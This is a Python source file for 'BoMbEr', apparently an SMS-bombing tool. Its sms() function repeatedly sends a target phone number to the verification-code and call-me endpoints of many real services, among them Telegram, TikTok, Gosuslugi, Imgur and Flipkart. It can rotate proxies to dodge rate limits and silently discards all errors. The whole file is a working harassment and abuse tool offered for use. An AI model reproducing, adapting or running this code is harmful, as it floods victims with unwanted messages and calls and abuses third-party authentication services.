 # -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#--------------------------------------(sms)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import smtplib
import os.path
import asyncio
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from progress.bar import Bar
from threading import Thread
from functools import reduce
from bs4 import BeautifulSoup
from requests import get, post
from selenium import webdriver
from os.path import exists, isfile
from random import choice, randint
from bs4 import BeautifulSoup as bs
from selenium_stealth import stealth
from progress.spinner import Spinner
from selenium.webdriver.common.by import By
from colorama import Fore, Back, Style, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

colorama.init()

header = {
	"Content-Type": "application/json"
}

def sms(prx, number, tm):
	try:
		if prx == 'yes':
			proxy = []
			t = time.monotonic()

			with open(r"proxies.txt", "r", encoding="utf-8") as file:
				for line in file:
					proxy.append(line)

			proxy = [line.rstrip() for line in proxy]

			while time.monotonic() - t < tm:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=num[0]
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number}, proxies = proxies)
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header, proxies = proxies)
				except:
					pass

		elif prx == 'no':
			t = time.monotonic()

			while time.monotonic() - t < tm:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=num[0]
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload)
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, json=payload)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}")
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number})
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header)
				except:
					pass

		else:
			pass

	except:
		pass